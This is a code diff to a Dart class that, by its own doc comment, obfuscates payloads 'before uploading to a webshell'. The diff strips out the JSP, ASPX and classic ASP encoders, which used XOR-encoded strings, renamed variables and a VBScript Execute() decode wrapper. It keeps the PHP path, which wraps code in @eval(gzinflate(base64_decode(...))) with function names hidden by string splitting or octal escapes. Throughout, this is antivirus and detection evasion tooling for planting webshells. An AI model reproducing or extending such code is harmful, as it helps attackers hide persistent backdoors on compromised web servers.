@@ -6,13 +6,10 @@ import 'deflate_stub.dart' if (dart.library.io) 'deflate_io.dart';
 
 /// Obfuscates and deobfuscates text payloads before uploading to a webshell.
 ///
-/// Strategy per language:
-///   PHP  → eval(gzinflate(base64_decode('...')))  + random nonce comment
-///   JSP  → rename local vars to single letters + XOR-encode string literals
-///   ASPX → rename local vars to single letters + XOR-encode string literals
-///   ASP  → VBScript Execute() with XOR hex-encoded inner code
+/// Only **PHP** is supported: `eval(gzinflate(base64_decode('…')))` wrappers with
+/// optional concat/octal/mixed function-name hiding and a random nonce.
 ///
-/// Each call produces a different output (random XOR key + nonce).
+/// Each successful obfuscation call produces different output (random splits + nonce).
 class PayloadObfuscator {
   // ── PHP detection ─────────────────────────────────────────────────────────
   //
@@ -54,93 +51,25 @@ class PayloadObfuscator {
     caseSensitive: false,
   );
 
-  // ── JSP detection ─────────────────────────────────────────────────────────
-  static final _jspHelperRe = RegExp(
-    r'<%!private static String _d\(int\[\]',
-    caseSensitive: true,
-  );
-  static final _jspCallRe = RegExp(r'_d\(new int\[\]\{([0-9,]*)\},(\d+)\)');
-
-  // ── ASPX detection ────────────────────────────────────────────────────────
-  static final _aspxHelperRe = RegExp(
-    r'<script runat="server">.*?static string _D\(int\[\]',
-    dotAll: true,
-    caseSensitive: true,
-  );
-  static final _aspxCallRe = RegExp(r'_D\(new int\[\]\{([0-9,]*)\},(\d+)\)');
-
-  // ── ASP detection ─────────────────────────────────────────────────────────
-  static final _aspWrapperRe = RegExp(
-    r'Execute _d\("([0-9a-f]+)",(\d+)\)',
-    caseSensitive: true,
-  );
-
-  // ── Scriptlet regex (JSP + ASPX) ──────────────────────────────────────────
-  static final _scriptletRe = RegExp(r'<%(!)?(?![=@])(.*?)%>', dotAll: true);
-
-  // ── Java/JSP keywords — never rename ─────────────────────────────────────
-  static const _javaKeywords = <String>{
-    'abstract', 'assert', 'boolean', 'break', 'byte', 'case', 'catch', 'char',
-    'class', 'const', 'continue', 'default', 'do', 'double', 'else', 'enum',
-    'extends', 'final', 'finally', 'float', 'for', 'goto', 'if', 'implements',
-    'import', 'instanceof', 'int', 'interface', 'long', 'native', 'new',
-    'package', 'private', 'protected', 'public', 'return', 'short', 'static',
-    'strictfp', 'super', 'switch', 'synchronized', 'this', 'throw', 'throws',
-    'transient', 'try', 'void', 'volatile', 'while', 'true', 'false', 'null',
-    // JSP implicit objects
-    'request', 'response', 'out', 'session', 'application', 'config',
-    'pageContext', 'page', 'exception',
-  };
-
-  // ── C#/ASPX keywords — never rename ──────────────────────────────────────
-  static const _csKeywords = <String>{
-    'abstract', 'as', 'base', 'bool', 'break', 'byte', 'case', 'catch', 'char',
-    'checked', 'class', 'const', 'continue', 'decimal', 'default', 'delegate',
-    'do', 'double', 'else', 'enum', 'event', 'explicit', 'extern', 'false',
-    'finally', 'fixed', 'float', 'for', 'foreach', 'goto', 'if', 'implicit',
-    'in', 'int', 'interface', 'internal', 'is', 'lock', 'long', 'namespace',
-    'new', 'null', 'object', 'operator', 'out', 'override', 'params', 'private',
-    'protected', 'public', 'readonly', 'ref', 'return', 'sbyte', 'sealed',
-    'short', 'sizeof', 'stackalloc', 'static', 'string', 'struct', 'switch',
-    'this', 'throw', 'true', 'try', 'typeof', 'uint', 'ulong', 'unchecked',
-    'unsafe', 'ushort', 'using', 'virtual', 'void', 'volatile', 'while', 'var',
-    // ASPX implicit objects
-    'Request', 'Response', 'Server', 'Session', 'Application', 'Context', 'Page',
-  };
-
   // ── Public API ────────────────────────────────────────────────────────────
 
-  static bool supportsType(String type) =>
-      type == 'php' || type == 'jsp' || type == 'asp' || type == 'aspx';
+  static bool supportsType(String type) => type == 'php';
 
   static bool isObfuscated(String content) {
     final t = content.trim();
     return _phpLiteralGzipRe.hasMatch(t) ||
         _phpLiteralB64Re.hasMatch(t) ||
         _phpObfGzipRe.hasMatch(t) ||
-        _phpObfB64Re.hasMatch(t) ||
-        _jspHelperRe.hasMatch(t) ||
-        _aspxHelperRe.hasMatch(t) ||
-        _aspWrapperRe.hasMatch(t);
+        _phpObfB64Re.hasMatch(t);
   }
 
   static String? obfuscate(String content, String type) {
-    switch (type) {
-      case 'php':  return _obfuscatePhp(content);
-      case 'jsp':  return _obfuscateJsp(content);
-      case 'aspx': return _obfuscateAspx(content);
-      case 'asp':  return _obfuscateAsp(content);
-      default:     return null;
-    }
+    if (type != 'php') return null;
+    return _obfuscatePhp(content);
   }
 
-  static String? tryDeobfuscate(String content) {
-    final t = content.trim();
-    return _deobfuscatePhp(t) ??
-        _deobfuscateJsp(t) ??
-        _deobfuscateAspx(t) ??
-        _deobfuscateAsp(t);
-  }
+  static String? tryDeobfuscate(String content) =>
+      _deobfuscatePhp(content.trim());
 
   static Uint8List? obfuscateBytes(Uint8List bytes, String type) {
     try {
@@ -155,11 +84,17 @@ class PayloadObfuscator {
   static String typeFromFileName(String name) {
     final ext = name.contains('.') ? name.split('.').last.toLowerCase() : '';
     switch (ext) {
-      case 'php':             return 'php';
-      case 'jsp': case 'jspx': return 'jsp';
-      case 'aspx':            return 'aspx';
-      case 'asp':             return 'asp';
-      default:                return 'other';
+      case 'php':
+        return 'php';
+      case 'jsp':
+      case 'jspx':
+        return 'jsp';
+      case 'aspx':
+        return 'aspx';
+      case 'asp':
+        return 'asp';
+      default:
+        return 'other';
     }
   }
 
@@ -167,8 +102,17 @@ class PayloadObfuscator {
 
   // PHP superglobals and special vars — never rename
   static const _phpSuperGlobals = <String>{
-    '_GET', '_POST', '_REQUEST', '_SERVER', '_FILES', '_COOKIE',
-    '_SESSION', '_ENV', '_GLOBALS', 'GLOBALS', 'this',
+    '_GET',
+    '_POST',
+    '_REQUEST',
+    '_SERVER',
+    '_FILES',
+    '_COOKIE',
+    '_SESSION',
+    '_ENV',
+    '_GLOBALS',
+    'GLOBALS',
+    'this',
   };
 
   static String _obfuscatePhp(String content) {
@@ -190,9 +134,12 @@ class PayloadObfuscator {
     final payload = base64Encode(supportsDeflate ? rawDeflate(bytes) : bytes);
     // Randomly pick one of three obfuscation modes for the PHP wrapper.
     switch (_rnd.nextInt(3)) {
-      case 0: return _phpConcatWrapper(payload, supportsDeflate);
-      case 1: return _phpOctalWrapper(payload, supportsDeflate);
-      default: return _phpMixedWrapper(payload, supportsDeflate);
+      case 0:
+        return _phpConcatWrapper(payload, supportsDeflate);
+      case 1:
+        return _phpOctalWrapper(payload, supportsDeflate);
+      default:
+        return _phpMixedWrapper(payload, supportsDeflate);
     }
   }
 
@@ -212,7 +159,9 @@ class PayloadObfuscator {
     final vars = _phpRandVarNames(withGzip ? 2 : 1);
     final assigns = StringBuffer();
     if (withGzip) assigns.write('\$${vars[0]}=${_splitConcat("gzinflate")};');
-    assigns.write('\$${vars[withGzip ? 1 : 0]}=${_splitConcat("base64_decode")};');
+    assigns.write(
+      '\$${vars[withGzip ? 1 : 0]}=${_splitConcat("base64_decode")};',
+    );
     final call = withGzip
         ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
         : '@eval(\$${vars[0]}(\'$payload\'))';
@@ -226,7 +175,9 @@ class PayloadObfuscator {
     if (withGzip) {
       assigns.write('\$${vars[0]}="${_toPhpOctal("gzinflate")}";');
     }
-    assigns.write('\$${vars[withGzip ? 1 : 0]}="${_toPhpOctal("base64_decode")}";');
+    assigns.write(
+      '\$${vars[withGzip ? 1 : 0]}="${_toPhpOctal("base64_decode")}";',
+    );
     final call = withGzip
         ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
         : '@eval(\$${vars[0]}(\'$payload\'))';
@@ -342,13 +293,18 @@ class PayloadObfuscator {
       try {
         var s = utf8.decode(rawInflate(base64Decode(b64)));
         return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
-      } catch (_) { return null; }
+      } catch (_) {
+        return null;
+      }
     }
+
     String? decodeB64(String b64) {
       try {
         var s = utf8.decode(base64Decode(b64));
         return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
-      } catch (_) { return null; }
+      } catch (_) {
+        return null;
+      }
     }
 
     for (final pattern in [_phpLiteralGzipRe, _phpObfGzipRe]) {
@@ -368,163 +324,6 @@ class PayloadObfuscator {
     return null;
   }
 
-  // ── JSP ───────────────────────────────────────────────────────────────────
-  //
-  // 1. Rename local variables to single letters (a, b, c …)
-  // 2. XOR-encode all Java string literals; inject _d() decode helper
-
-  static const _jspHelperDecl =
-      '<%!private static String _d(int[]c,int k)'
-      '{StringBuilder r=new StringBuilder();'
-      'for(int x:c)r.append((char)(x^k));return r.toString();}%>';
-
-  static String _obfuscateJsp(String content) {
-    final key = _rndKey();
-    final allBodies = _scriptletRe.allMatches(content)
-        .map((m) => m.group(2)!)
-        .join('\n');
-    final renameMap = _buildRenameMap(allBodies, _javaKeywords);
-    final processed = _processScriptlets(
-      content, key, renameMap,
-      (ints, k) => '_d(new int[]{${ints.join(",")}},$k)',
-    );
-    return _oneLiner('$_jspHelperDecl$processed');
-  }
-
-  static String? _deobfuscateJsp(String t) {
-    if (!_jspHelperRe.hasMatch(t)) return null;
-    var out = t.replaceAll(
-      RegExp(
-        r'<%!private static String _d\(int\[\]c,int k\)\{.*?\}%>\n?',
-        dotAll: true,
-      ),
-      '',
-    );
-    out = out.replaceAllMapped(_jspCallRe, (m) {
-      try {
-        final ints =
-            m.group(1)!.split(',').where((s) => s.isNotEmpty).map(int.parse);
-        final key = int.parse(m.group(2)!);
-        return '"${_escapeJava(String.fromCharCodes(ints.map((c) => c ^ key)))}"';
-      } catch (_) {
-        return m.group(0)!;
-      }
-    });
-    return out.trim();
-  }
-
-  // ── ASPX ──────────────────────────────────────────────────────────────────
-
-  static const _aspxHelperScript =
-      '<script runat="server">'
-      'static string _D(int[]c,int k){'
-      'var r=new System.Text.StringBuilder();'
-      'foreach(var x in c)r.Append((char)(x^k));'
-      'return r.ToString();}'
-      '</script>';
-
-  static String _obfuscateAspx(String content) {
-    final key = _rndKey();
-    final allBodies = _scriptletRe.allMatches(content)
-        .map((m) => m.group(2)!)
-        .join('\n');
-    final renameMap = _buildRenameMap(allBodies, _csKeywords);
-    final processed = _processScriptlets(
-      content, key, renameMap,
-      (ints, k) => '_D(new int[]{${ints.join(",")}},$k)',
-    );
-    final end = _lastDirectiveEnd(processed);
-    final merged = '${processed.substring(0, end)}$_aspxHelperScript'
-        '${processed.substring(end)}';
-    return _oneLiner(merged);
-  }
-
-  static String? _deobfuscateAspx(String t) {
-    if (!_aspxHelperRe.hasMatch(t)) return null;
-    var out = t.replaceAll(
-      RegExp(
-        r'<script runat="server">static string _D\(int\[\]c.*?</script>',
-        dotAll: true,
-      ),
-      '',
-    );
-    out = out.replaceAllMapped(_aspxCallRe, (m) {
-      try {
-        final ints =
-            m.group(1)!.split(',').where((s) => s.isNotEmpty).map(int.parse);
-        final key = int.parse(m.group(2)!);
-        return '"${_escapeCSharp(String.fromCharCodes(ints.map((c) => c ^ key)))}"';
-      } catch (_) {
-        return m.group(0)!;
-      }
-    });
-    return out.trim();
-  }
-
-  // ── ASP (classic VBScript) ────────────────────────────────────────────────
-
-  static String _obfuscateAsp(String content) {
-    var code = content.trim();
-    code = code.replaceAll(RegExp(r'<%@[^%]*%>\s*'), '');
-    if (code.startsWith('<%')) code = code.substring(2);
-    if (code.endsWith('%>')) code = code.substring(0, code.length - 2);
-    code = code.trim();
-    final key = _rndKey();
-    final hex = code.runes
-        .map((c) => (c ^ key).toRadixString(16).padLeft(4, '0'))
-        .join();
-    return '<%@ Language="VBScript" %>'
-        '<%Function _d(h,k):Dim r,i:r="":For i=1 To Len(h) Step 4:'
-        'r=r&Chr(CLng("&H"&Mid(h,i,4)) Xor k):Next:_d=r:End Function:'
-        'Execute _d("$hex",$key)%>';
-  }
-
-  static String? _deobfuscateAsp(String t) {
-    final m = _aspWrapperRe.firstMatch(t);
-    if (m == null) return null;
-    try {
-      final hex = m.group(1)!;
-      final key = int.parse(m.group(2)!);
-      final sb = StringBuffer('<%@ Language="VBScript" %>\n<%\n');
-      for (var i = 0; i < hex.length; i += 4) {
-        sb.writeCharCode(int.parse(hex.substring(i, i + 4), radix: 16) ^ key);
-      }
-      sb.write('\n%>');
-      return sb.toString();
-    } catch (_) {
-      return null;
-    }
-  }
-
-  // ── Variable renaming ─────────────────────────────────────────────────────
-
-  /// Scan [code] for local variable declarations and map each name to a
-  /// single-letter name (a, b, … z, aa, ab, …).
-  ///
-  /// Detection pattern: `TypeName varName` where TypeName is either a
-  /// capitalised class name or a primitive/var keyword, and varName is
-  /// lower-camel with ≥ 2 chars (single-letter loop vars are already short).
-  static Map<String, String> _buildRenameMap(
-      String code, Set<String> keywords) {
-    final declared = <String>{};
-    final declRe = RegExp(
-      r'\b(?:[A-Z][a-zA-Z0-9_]*(?:\s*\[\])?|'
-      r'(?:byte|short|int|long|float|double|boolean|char|bool|var|string|object)'
-      r'(?:\s*\[\])?)'
-      r'\s+([a-z][a-zA-Z0-9_]+)\s*(?=[=;:,\)\{])',
-    );
-    for (final m in declRe.allMatches(code)) {
-      final name = m.group(1)!;
-      if (!keywords.contains(name)) declared.add(name);
-    }
-    final map = <String, String>{};
-    var idx = 0;
-    for (final n in declared) {
-      map[n] = _shortName(idx++);
-    }
-    return map;
-  }
-
   /// Generates: a … z, aa, ab … az, ba …
   static String _shortName(int i) {
     if (i < 26) return String.fromCharCode(0x61 + i);
@@ -533,125 +332,5 @@ class PayloadObfuscator {
     return '${String.fromCharCode(0x61 + hi)}${String.fromCharCode(0x61 + lo)}';
   }
 
-  static String _applyRenameMap(String code, Map<String, String> map) {
-    var result = code;
-    for (final entry in map.entries) {
-      result = result.replaceAllMapped(
-        RegExp(r'\b' + RegExp.escape(entry.key) + r'\b'),
-        (_) => entry.value,
-      );
-    }
-    return result;
-  }
-
-  // ── Shared helpers ────────────────────────────────────────────────────────
-
-  /// Apply variable rename + string literal encoding to every scriptlet block.
-  static String _processScriptlets(
-    String src,
-    int key,
-    Map<String, String> renameMap,
-    String Function(List<int>, int) callTemplate,
-  ) {
-    final result = StringBuffer();
-    var pos = 0;
-    for (final match in _scriptletRe.allMatches(src)) {
-      result.write(src.substring(pos, match.start));
-      final isDecl = match.group(1) != null;
-      var body = match.group(2)!;
-      if (renameMap.isNotEmpty) body = _applyRenameMap(body, renameMap);
-      body = _encodeStringLiterals(body, key, callTemplate);
-      result.write(isDecl ? '<%!' : '<%');
-      result.write(body);
-      result.write('%>');
-      pos = match.end;
-    }
-    result.write(src.substring(pos));
-    return result.toString();
-  }
-
-  /// Replace `"..."` string literals with XOR-encoded call expressions.
-  /// Skips `//` line comments and `/* */` block comments.
-  static String _encodeStringLiterals(
-    String code,
-    int key,
-    String Function(List<int>, int) callTemplate,
-  ) {
-    final out = StringBuffer();
-    var i = 0;
-    while (i < code.length) {
-      if (i + 1 < code.length && code[i] == '/' && code[i + 1] == '/') {
-        final nl = code.indexOf('\n', i);
-        final end = nl == -1 ? code.length : nl + 1;
-        out.write(code.substring(i, end));
-        i = end;
-        continue;
-      }
-      if (i + 1 < code.length && code[i] == '/' && code[i + 1] == '*') {
-        final end = code.indexOf('*/', i + 2);
-        final close = end == -1 ? code.length : end + 2;
-        out.write(code.substring(i, close));
-        i = close;
-        continue;
-      }
-      if (code[i] == '"') {
-        final strEnd = _findStringEnd(code, i + 1);
-        if (strEnd != -1) {
-          final inner = code.substring(i + 1, strEnd);
-          final decoded = _unescapeJava(inner);
-          final ints = decoded.runes.map((c) => c ^ key).toList();
-          out.write(callTemplate(ints, key));
-          i = strEnd + 1;
-          continue;
-        }
-      }
-      out.write(code[i]);
-      i++;
-    }
-    return out.toString();
-  }
-
-  static int _findStringEnd(String s, int start) {
-    var i = start;
-    while (i < s.length) {
-      if (s[i] == '\\') {
-        i += 2;
-        continue;
-      }
-      if (s[i] == '"') return i;
-      i++;
-    }
-    return -1;
-  }
-
-  static String _unescapeJava(String s) => s
-      .replaceAll(r'\"', '"')
-      .replaceAll(r'\\', '\\')
-      .replaceAll(r'\n', '\n')
-      .replaceAll(r'\r', '\r')
-      .replaceAll(r'\t', '\t');
-
-  static String _escapeJava(String s) => s
-      .replaceAll('\\', r'\\')
-      .replaceAll('"', r'\"')
-      .replaceAll('\n', r'\n')
-      .replaceAll('\r', r'\r')
-      .replaceAll('\t', r'\t');
-
-  static String _escapeCSharp(String s) => _escapeJava(s);
-
-  static int _lastDirectiveEnd(String src) {
-    final re = RegExp(r'<%@[^%]*%>');
-    int end = 0;
-    for (final m in re.allMatches(src)) {
-      if (m.end > end) end = m.end;
-    }
-    return end;
-  }
-
-  static String _oneLiner(String s) =>
-      s.replaceAll('\r\n', '').replaceAll('\r', '').replaceAll('\n', '');
-
   static final _rnd = Random.secure();
-  static int _rndKey() => _rnd.nextInt(180) + 20;
 }
